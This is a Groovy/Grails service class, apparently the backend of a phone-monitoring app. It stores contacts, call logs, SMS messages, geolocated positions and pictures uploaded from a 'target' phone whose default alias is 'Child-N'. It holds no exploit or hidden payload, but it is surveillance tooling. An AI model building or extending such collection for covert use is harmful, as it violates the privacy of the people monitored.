package com.xaviar.service

import org.codehaus.jackson.map.DeserializationConfig
import org.codehaus.jackson.map.ObjectMapper
import org.codehaus.jackson.type.TypeReference

import com.spy.tools.SpyUtils
import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.FileData
import com.xaviar.domain.Location
import com.xaviar.domain.Sms
import com.xaviar.domain.TargetPhone
import com.xaviar.domain.User
import com.xaviar.market.rest.item.DataHolder

class TargetPhoneService {

	def save(DataHolder dataHolder,String authSimSubscriberId,User authUser){
		
		TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
		
		//target phone parameters
		if(dataHolder.containsKey(dataHolder.PHONE_PARAMS)){
			addPhoneParams(dataHolder, authSimSubscriberId,authUser);
		}
		
		for ( String key : dataHolder.getMap().keySet() ) {			
			switch(key){				
				case dataHolder.PHONE_PARAMS : break;
				case dataHolder.CONTACTS : addContacts(dataHolder, targetPhone); break;
				case dataHolder.CALL_LOG : addCallLogs(dataHolder, targetPhone); break;
				case dataHolder.PHONE_EVENT : addCallLogEvents(dataHolder, targetPhone); break;
				case dataHolder.LOCATION_EVENT : addLocationEvents(dataHolder, targetPhone); break;
				case dataHolder.SMS : addSmses(dataHolder, targetPhone); break;
				case dataHolder.SMS_EVENT : addSmsEvents(dataHolder, targetPhone); break;
				case dataHolder.BIN_ZIP_PICTURES : addPictures(dataHolder, targetPhone); break;				
			}			
		}
	}

	def addPictures(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientPics = dataHolder.get(DataHolder.BIN_ZIP_PICTURES);
		if (clientPics != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<FileData> clientPictures = mapper.readValue(clientPics,new TypeReference<List<FileData>>() {
					});
			clientPictures.each{
				it.save(flush:true, failOnError:true);
			}
		}
	}

	def addSmsEvents(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientSmsEvent = dataHolder.get(DataHolder.SMS_EVENT);
		if (clientSmsEvent != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Sms> smsEvents = mapper.readValue(clientSmsEvent,new TypeReference<List<Sms>>() {
					});
			smsEvents.each{
				try{
					it.targetPhone=targetPhone;
					it.countryCode = SpyUtils.getCountryCode(it.address);
					it.recordOrigin="EVENT";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true);
				}catch(Exception e){
					println (it.address + " : " + it.msg);
				}
			}
		}
	}

	def addSmses(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientSms = dataHolder.get(DataHolder.SMS);
		if (clientSms != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Sms> smses = mapper.readValue(clientSms,new TypeReference<List<Sms>>() {
					});

			smses.each{
				try{
					it.targetPhone=targetPhone;
					it.countryCode = SpyUtils.getCountryCode(it.address);
					it.recordOrigin="ORIGINAL";
					it.recordState="CREATED";
					it.save(flush:true, failOnError:true);
				}catch(Exception e){
					println (it.address + " : " + it.msg);
				}
			}
		}
	}

	def addLocationEvents(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientLocation = dataHolder.get(DataHolder.LOCATION_EVENT);
		if (clientLocation != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Location> locations = mapper.readValue(clientLocation,new TypeReference<List<Location>>() {
					});
			locations.each{
				it.targetPhone=targetPhone;
				try{
					def address = SpyUtils.getGeocode(it.latitude,it.longitude).get(0).formattedAddress;
					it.address = address;
					it.recordOrigin="EVENT";
					it.recordState="CREATED";
				}catch(Exception e){
					it.address = "כתובת לא קיימת";
					it.recordOrigin="EVENT";
					it.recordState="CREATED";
					println (e.message);
				}

				it.save(flush:true, failOnError:true);
			}
		}
	}

	def addCallLogEvents(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientPhoneEvent = dataHolder.get(DataHolder.PHONE_EVENT);
		if (clientPhoneEvent != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<CallLog> phoneEvents = mapper.readValue(clientPhoneEvent,new TypeReference<List<CallLog>>() {
					});
			phoneEvents.each{
				it.targetPhone=targetPhone;
				it.countryCode = SpyUtils.getCountryCode(it.phoneNumber);
				it.recordOrigin="EVENT";
				it.recordState="CREATED";
				it.save(flush:true, failOnError:true);
			}
		}
	}

	def addCallLogs(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientCallLog = dataHolder.get(DataHolder.CALL_LOG);
		if (clientCallLog != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<CallLog> callLogs = mapper.readValue(clientCallLog,new TypeReference<List<CallLog>>() {
					});

			callLogs.each{
				it.targetPhone=targetPhone;
				it.countryCode = SpyUtils.getCountryCode(it.phoneNumber);
				it.recordOrigin="ORIGINAL";
				it.recordState="CREATED";
				it.save(flush:true, failOnError:true);
			}
		}
	}

	def addContacts(DataHolder dataHolder, TargetPhone targetPhone) {
		String clientContacts = dataHolder.get(DataHolder.CONTACTS);
		if (clientContacts != null) {
			ObjectMapper mapper = new ObjectMapper();
			mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
			List<Contact> contacts = mapper.readValue(clientContacts,new TypeReference<List<Contact>>() {
					});
			contacts.each{
				it.targetPhone=targetPhone;
				it.countryCode = SpyUtils.getCountryCode(it.number);
				it.recordOrigin="ORIGINAL";
				it.recordState="CREATED";
				it.save(flush:true, failOnError:true);
			}
		}
	}


	def addPhoneParams(DataHolder dataHolder,String authSimSubscriberId,User authUser){
		TargetPhone existingTP = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
		if(existingTP!=null){
			//maybe a problem TODO - fix login
		}else{
			int targetsCount = authUser.targetPhones.size();
			String clientPhoneParams = dataHolder.get(DataHolder.PHONE_PARAMS);
			if (clientPhoneParams != null) {
				ObjectMapper mapper = new ObjectMapper();
				mapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES, false);
				List<TargetPhone> targetPhones = mapper.readValue(clientPhoneParams,new TypeReference<List<TargetPhone>>() {
						});

				TargetPhone targetPhone = targetPhones.get(0);
				targetPhone.simSubscriberId=authSimSubscriberId;
				targetPhone.user = authUser;
				targetPhone.alias = "Child-" + (targetsCount + 1);
				targetPhone.save(flush:true, failOnError:true);
			}
		}
	}
}
